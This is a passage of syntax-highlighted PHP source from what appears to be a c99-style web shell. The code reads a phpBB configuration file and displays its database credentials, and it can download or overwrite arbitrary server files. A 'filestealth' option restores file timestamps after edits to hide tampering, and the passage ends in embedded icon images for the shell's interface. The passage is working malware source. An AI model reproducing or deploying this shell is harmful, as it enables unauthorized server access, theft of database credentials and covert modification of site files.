            <span class="k">include</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;phpBB configuration is detected in this file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dbms</span> <span class="o">==</span> <span class="s2">&quot;mysql4&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dbms</span> <span class="o">=</span> <span class="s2">&quot;mysql&quot;</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$dbms</span> <span class="o">==</span> <span class="s2">&quot;mysql&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;sql_server=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_login=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbuser</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_passwd=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbpasswd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_port=3306&amp;sql_db=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbname</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;Connect to DB&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;But, you can&#39;t connect to forum sql-base, because db-software=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dbms</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> is not supported by &quot;</span><span class="o">.</span><span class="nv">$sh_name</span><span class="o">.</span><span class="s2">&quot;. Please, report us for fix.&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;Parameters for manual connect:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$cfgvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;dbms&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbms</span><span class="p">,</span><span class="s2">&quot;dbhost&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbhost</span><span class="p">,</span><span class="s2">&quot;dbname&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbname</span><span class="p">,</span><span class="s2">&quot;dbuser&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbuser</span><span class="p">,</span><span class="s2">&quot;dbpasswd&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbpasswd</span><span class="p">);</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cfgvars</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div style=</span><span class="se">\&quot;</span><span class="s2">border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: &quot;</span><span class="o">.</span><span class="nv">$highlight_background</span> <span class="o">.</span><span class="s2">&quot;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$white</span><span class="p">))</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();}</span>
        <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$white</span><span class="p">))</span> <span class="p">{</span><span class="nx">tpshexit</span><span class="p">();}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;download&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;notepad&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: text/plain&quot;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;.txt</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
        <span class="k">echo</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$inf</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$white</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imgsize</span><span class="p">))</span> <span class="p">{</span><span class="nv">$imgsize</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;}</span>
          <span class="nv">$width</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
          <span class="nv">$height</span> <span class="o">=</span> <span class="nv">$inf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">/</span><span class="mi">100</span><span class="o">*</span><span class="nv">$imgsize</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Size:&amp;lt;/b&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="nv">$sizes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;100&quot;</span><span class="p">,</span><span class="s2">&quot;50&quot;</span><span class="p">,</span><span class="s2">&quot;20&quot;</span><span class="p">);</span>
          <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sizes</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;imgsize=&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$imgsize</span> <span class="o">!=</span> <span class="nv">$v</span> <span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;u&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=img&amp;white=1&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$width</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$height</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
          <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
          <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
          <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: &quot;</span><span class="o">.</span><span class="nv">$inf</span><span class="p">[</span><span class="s2">&quot;mime&quot;</span><span class="p">]);</span>
          <span class="nb">readfile</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
          <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span>
       <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nv">$stat</span> <span class="o">=</span> <span class="nb">stat</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
        <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Can&#39;t write to file!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
        <span class="k">else</span>
        <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Saved!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
         <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$edit_text</span><span class="p">);</span>
         <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">8</span><span class="p">]);}</span>
         <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$edit_text</span><span class="p">;</span>
        <span class="p">}</span>
       <span class="p">}</span>
       <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;}</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Reset</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">edit_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of </span><span class="se">\$</span><span class="s2">GLOBALS.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Unknown file type (&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;), please select type manually.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
    <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
    <span class="nv">$images</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s2">&quot;arrow_ltr&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhJgAWAIABAP///wAAACH5BAHoAwEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ&quot;</span><span class="o">.</span>
    <span class="s2">&quot;SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;back&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8&quot;</span><span class="o">.</span>
    <span class="s2">&quot;aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Wg0JADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;buffer&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo&quot;</span><span class="o">.</span>
    <span class="s2">&quot;eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;change&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+&quot;</span><span class="o">.</span>
    <span class="s2">&quot;/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC&quot;</span><span class="o">.</span>
    <span class="s2">&quot;wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL&quot;</span><span class="o">.</span>
    <span class="s2">&quot;zMshADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;delete&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp&quot;</span><span class="o">.</span>
    <span class="s2">&quot;6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw&quot;</span><span class="o">.</span>
    <span class="s2">&quot;sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv&quot;</span><span class="o">.</span>
    <span class="s2">&quot;vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl&quot;</span><span class="o">.</span>
    <span class="s2">&quot;ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5&quot;</span><span class="o">.</span>
    <span class="s2">&quot;BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4&quot;</span><span class="o">.</span>
    <span class="s2">&quot;STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G&quot;</span><span class="o">.</span>
    <span class="s2">&quot;BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ&quot;</span><span class="o">.</span>
    <span class="s2">&quot;jwVFHBgiEGQFIgQasYkcSbJQIAA7&quot;</span><span class="p">,</span>
    <span class="s2">&quot;download&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu&quot;</span><span class="o">.</span>
    <span class="s2">&quot;EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;forward&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8&quot;</span><span class="o">.</span>
    <span class="s2">&quot;aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt&quot;</span><span class="o">.</span>
    <span class="s2">&quot;WqsJADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;home&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS&quot;</span><span class="o">.</span>
    <span class="s2">&quot;krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j&quot;</span><span class="o">.</span>
    <span class="s2">&quot;VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;mode&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO&quot;</span><span class="o">.</span>
    <span class="s2">&quot;2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/&quot;</span><span class="o">.</span>
    <span class="s2">&quot;dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=&quot;</span><span class="p">,</span>
    <span class="s2">&quot;search&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//&quot;</span><span class="o">.</span>
    <span class="s2">&quot;/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap&quot;</span><span class="o">.</span>
    <span class="s2">&quot;s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD&quot;</span><span class="o">.</span>
    <span class="s2">&quot;AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr&quot;</span><span class="o">.</span>
    <span class="s2">&quot;Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;setup&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="s2">&quot;R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC&quot;</span><span class="o">.</span>
    <span class="s2">&quot;QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA&quot;</span><span class="o">.</span>
    <span class="s2">&quot;ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB&quot;</span><span class="o">.</span>
    <span class="s2">&quot;qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE&quot;</span><span class="o">.</span>
    <span class="s2">&quot;OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==&quot;</span><span class="p">,</span>
    <span class="s2">&quot;small_dir&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span>
